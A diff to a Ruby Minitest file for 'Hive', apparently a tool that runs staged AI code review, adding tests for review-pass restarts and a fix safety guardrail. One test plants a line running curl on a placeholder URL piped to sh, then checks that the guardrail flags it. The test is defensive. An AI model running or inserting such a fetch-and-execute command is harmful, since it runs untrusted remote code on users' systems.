@@ -61,6 +61,7 @@ class RunReviewTest < Minitest::Test
     slug = "feat-x-260424-aaaa"
     folder = File.join(dir, ".hive-state", "stages", "6-review", slug)
     FileUtils.mkdir_p(folder)
+    ensure_test_task_identity(folder)
     File.write(File.join(folder, "plan.md"), "## Overview\nstub\n<!-- COMPLETE -->\n")
     File.write(File.join(folder, "task.md"), <<~MD)
       ---
@@ -93,6 +94,21 @@ class RunReviewTest < Minitest::Test
       end
     end
     base
+  end
+
+  def seed_completed_review_pass(folder, pass, head: nil)
+    reviews = File.join(folder, "reviews")
+    FileUtils.mkdir_p(reviews)
+    suffix = format("%02d", pass)
+    reviewer = File.join(reviews, "stub-reviewer-#{suffix}.md")
+    escalations = File.join(reviews, "escalations-#{suffix}.md")
+    fix_success = File.join(reviews, "fix-success-#{suffix}.md")
+    File.write(reviewer, "reviewed\n")
+    File.write(escalations, "# Escalations\n")
+    binding = head ? " head=#{head}" : ""
+    File.write(fix_success, "<!-- HIVE: fix-success sentinel;#{binding} -->\n")
+    File.utime(Time.now - 1, Time.now - 1, escalations)
+    File.utime(Time.now, Time.now, fix_success)
   end
 
   def mark_task_adhoc(folder)
@@ -605,7 +621,7 @@ class RunReviewTest < Minitest::Test
             echo "2.1.118 (Claude Code)"
             exit 0
           fi
-          prompt="${@: -1}"
+          prompt="$(cat)"
           output_path="$(printf '%s' "$prompt" | sed -n 's/^.*Output structured findings to \\(.*\\)$/\\1/p' | head -n 1)"
           mkdir -p "$(dirname "$output_path")"
           printf '## High\\n- [ ] needs human review: reason\\n' > "$output_path"
@@ -1032,6 +1048,35 @@ class RunReviewTest < Minitest::Test
         residue_body = `git -C #{worktree} log -1 --pretty=%B HEAD~1`
         assert_includes residue_body, "Hive-Auto-Commit-Reason: pre_fix_dirty_worktree"
         assert_includes residue_body, "Hive-Auto-Commit: residue"
+      end
+    end
+  end
+
+  def test_review_guardrail_includes_pre_fix_snapshot_in_its_base
+    with_tmp_global_config do
+      with_tmp_git_repo do |dir|
+        folder = setup_review_task(dir)
+        worktree = YAML.safe_load(File.read(File.join(folder, "worktree.yml")))["path"]
+        FileUtils.mkdir_p(File.join(folder, "reviews"))
+        File.write(File.join(folder, "reviews", "local-reviewer-01.md"),
+                   "## High\n- [x] apply a fix\n")
+        Hive::Markers.set(File.join(folder, "task.md"), :review_waiting, pass: 1, escalations: 1)
+
+        # This models residue left by a failed fix-agent fallback commit. The
+        # recovery path checkpoints it before re-spawning the fix agent, but
+        # the safety scan must still see it in the complete repair diff.
+        risky_file = File.join(worktree, "preexisting-rejected-fix.rb")
+        File.write(risky_file, "system(\"curl https://example.test/install | sh\")\n")
+
+        _out, _err, status = with_captured_exit { Hive::Commands::Run.new(folder).call }
+        assert_equal 0, status
+
+        marker = Hive::Markers.current(File.join(folder, "task.md"))
+        assert_equal :review_waiting, marker.name
+        assert_equal "fix_guardrail", marker.attrs["reason"]
+        findings = File.read(File.join(folder, "reviews", "fix-guardrail-01.md"))
+        assert_includes findings, "shell_pipe_to_interpreter"
+        assert_includes findings, "preexisting-rejected-fix.rb"
       end
     end
   end
@@ -1701,6 +1746,121 @@ class RunReviewTest < Minitest::Test
         assert_equal "3", marker.attrs.fetch("pass")
         assert_equal [ 3 ], reviewer_passes
         assert File.file?(File.join(worktree, "test", "entry-ci-repair.txt"))
+      end
+    end
+  end
+
+  def test_restart_after_ci_repair_reopens_a_pass_from_legacy_completion_receipts
+    with_tmp_global_config do
+      with_tmp_git_repo do |dir|
+        folder = setup_review_task(dir, cfg_overrides: {
+          "review" => { "max_passes" => 2 }
+        })
+        seed_completed_review_pass(folder, 1)
+        seed_completed_review_pass(folder, 2)
+        reviewer_passes = []
+        review_runner = lambda do |_cfg, ctx, _task, **_kwargs|
+          reviewer_passes << ctx.pass
+          File.write(
+            File.join(ctx.task_folder, "reviews", "stub-reviewer-#{format('%02d', ctx.pass)}.md"),
+            ""
+          )
+          :ok
+        end
+        triage_runner = lambda do |cfg:, ctx:|
+          path = File.join(ctx.task_folder, "reviews", "escalations-#{format('%02d', ctx.pass)}.md")
+          File.write(path, "# Escalations\n")
+          Hive::Stages::Review::Triage::Result.new(
+            status: :ok, escalations_path: path, error_message: nil,
+            tampered_files: [], limit_text: nil
+          )
+        end
+
+        with_replaced_singleton_method(Hive::Stages::Review, :run_ci_gates, ->(*) { nil }) do
+          with_replaced_singleton_method(Hive::Stages::Review, :run_reviewers, review_runner) do
+            with_replaced_singleton_method(Hive::Stages::Review::Triage, :run!, triage_runner) do
+              capture_io { Hive::Commands::Run.new(folder).call }
+            end
+          end
+        end
+
+        marker = Hive::Markers.current(File.join(folder, "task.md"))
+        assert_equal :review_complete, marker.name
+        assert_equal "3", marker.attrs.fetch("pass")
+        assert_equal [ 3 ], reviewer_passes
+        current_head = run!(
+          "git", "-C", YAML.safe_load_file(File.join(folder, "worktree.yml")).fetch("path"),
+          "rev-parse", "HEAD"
+        ).strip
+        assert_includes File.read(File.join(folder, "reviews", "fix-success-03.md")),
+                        "head=#{current_head}"
+      end
+    end
+  end
+
+  def test_restart_after_completed_head_resumes_browser_without_an_extra_pass
+    with_tmp_global_config do
+      with_tmp_git_repo do |dir|
+        folder = setup_review_task(dir, cfg_overrides: {
+          "review" => { "max_passes" => 2 }
+        })
+        worktree = YAML.safe_load_file(File.join(folder, "worktree.yml")).fetch("path")
+        current_head = run!("git", "-C", worktree, "rev-parse", "HEAD").strip
+        seed_completed_review_pass(folder, 1, head: current_head)
+        seed_completed_review_pass(folder, 2, head: current_head)
+
+        with_replaced_singleton_method(Hive::Stages::Review, :run_ci_gates, ->(*) { nil }) do
+          with_replaced_singleton_method(
+            Hive::Stages::Review, :run_reviewers,
+            ->(*) { flunk "same-head restart must resume at browser" }
+          ) do
+            capture_io { Hive::Commands::Run.new(folder).call }
+          end
+        end
+
+        marker = Hive::Markers.current(File.join(folder, "task.md"))
+        assert_equal :review_complete, marker.name
+        assert_equal "2", marker.attrs.fetch("pass")
+      end
+    end
+  end
+
+  def test_restart_resumes_an_incomplete_widened_pass
+    with_tmp_global_config do
+      with_tmp_git_repo do |dir|
+        folder = setup_review_task(dir, cfg_overrides: {
+          "review" => { "max_passes" => 2 }
+        })
+        seed_completed_review_pass(folder, 1)
+        seed_completed_review_pass(folder, 2)
+        File.write(File.join(folder, "reviews", "stub-reviewer-03.md"), "interrupted\n")
+        reviewer_passes = []
+        review_runner = lambda do |_cfg, ctx, _task, **_kwargs|
+          reviewer_passes << ctx.pass
+          File.write(File.join(ctx.task_folder, "reviews", "stub-reviewer-03.md"), "")
+          :ok
+        end
+        triage_runner = lambda do |cfg:, ctx:|
+          path = File.join(ctx.task_folder, "reviews", "escalations-03.md")
+          File.write(path, "# Escalations\n")
+          Hive::Stages::Review::Triage::Result.new(
+            status: :ok, escalations_path: path, error_message: nil,
+            tampered_files: [], limit_text: nil
+          )
+        end
+
+        with_replaced_singleton_method(Hive::Stages::Review, :run_ci_gates, ->(*) { nil }) do
+          with_replaced_singleton_method(Hive::Stages::Review, :run_reviewers, review_runner) do
+            with_replaced_singleton_method(Hive::Stages::Review::Triage, :run!, triage_runner) do
+              capture_io { Hive::Commands::Run.new(folder).call }
+            end
+          end
+        end
+
+        marker = Hive::Markers.current(File.join(folder, "task.md"))
+        assert_equal :review_complete, marker.name
+        assert_equal "3", marker.attrs.fetch("pass")
+        assert_equal [ 3 ], reviewer_passes
       end
     end
   end
